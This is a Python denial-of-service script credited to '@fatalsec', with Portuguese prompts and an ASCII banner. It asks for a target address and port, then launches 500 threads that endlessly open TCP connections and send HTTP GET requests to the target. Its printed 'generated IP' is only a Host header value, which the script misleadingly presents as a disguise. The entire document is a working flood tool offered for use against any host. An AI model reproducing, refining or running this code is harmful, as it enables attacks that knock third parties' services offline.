#Script programado por @fatalsec

#Script programmed by @fatalsec

#プログラムは @fatalsec

#Сценарий запрограммирован @Fatalsec

import datetime
e = datetime.datetime.now()
data = (f'{e.day}/{e.month}/{e.year}')
hora = (f'{e.hour}:{e.minute}:{e.second}')
ataque = (f'\033[1;96mATAQUE INICIADO: \033[1;91m{data} \033[1;96mAS: \033[1;91m{hora}')


logo =  ('''
\033[1;96m _______ _  \033[1;91m______  ______    \033[1;96m _ ______________  
\033[1;96m(_______) |\033[1;91m/ __   |/ __   |   \033[1;96m| (_______(_____ \ 
\033[1;96m _____  | |\033[1;91m | //| | | //| |\033[1;96m _ \033[1;96m| |  ____  _____) )
\033[1;96m|  ___) | |\033[1;91m |// | | |// | |\033[1;96m/ || | (___ \(_____ ( 
\033[1;96m| |     | |\033[1;91m  /__| |  /__| \033[1;96m( (_| |_____) )     | |
\033[1;96m|_|     |_|\033[1;91m\_____/ \_____/ \033[1;96m\____(______/      |_|

\033[1;96m Codded By \033[1;91m@Fatalsec
''')




import socket
import threading
import random # <--- meliodas kkkkk
import os
import time
ip1 = random.choice([1, 2, 3, 4, 5, 6, 7, 8, 9])
ip2 = random.choice([9, 8, 7, 6, 5, 4, 3, 2, 1])
ip22 = random.choice([9, 8, 7, 6, 5, 4, 3, 2, 1])
ip11 = random.choice([1, 2, 3, 4, 5, 6, 7, 8, 9])

ipgerado = (f'182.21.{ip11}{ip22}.{ip1}{ip2}') #gera o ip fake
print (logo)

print (f'SEU IP GERADO: {ipgerado}')
try:
	alvo = input("\033[1;96mINSIRA O ENDEREÇO ALVO: \033[1;91m")
	porta = int(input("\033[1;96mINSIRA A PORTA DO ENDEREÇO ALVO: \033[1;91m"))
except ValueError as error:
	print ('ERRO, ENDEREÇO OU PORTA INCORRETOS!')
	exit()
except KeyboardInterrupt as error:
	print (' ')
	print ('SCRIPT CANCELADO!')
	exit()
def ddos():   #conecta as portas e o alvo
	while True:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((alvo, porta))
		s.sendto(("GET /" + alvo + " HTTP/1.1\r\n").encode('ascii'), (alvo, porta))
		s.sendto(("Host: " + ipgerado + "\r\n\r\n").encode('ascii'), (alvo, porta))
		s.close()
time.sleep(0.5)
try:
	for i in range(500): # ataca kkk
	    thread = threading.Thread(target=ddos)
	    thread.start()
	    flood = 0
	    for i in range(500):
	                flood = flood + 1
	                print (f'FLOOD {flood}/500')
	                time.sleep(0.1)
	                os.system('clear')
	                print (ataque)
	                print (f'\033[1;96mENVIANDO 500 PACOTES PARA: \033[1;91m{alvo} !\033[1;96m')
	print (f'\033[1;96mATAQUE FINALIZADO AS: \033[1;91m{hora}\033[0;0m')
	exit()
except KeyboardInterrupt as error:
	print (' ')
	print ('script cancelado!')
	exit()
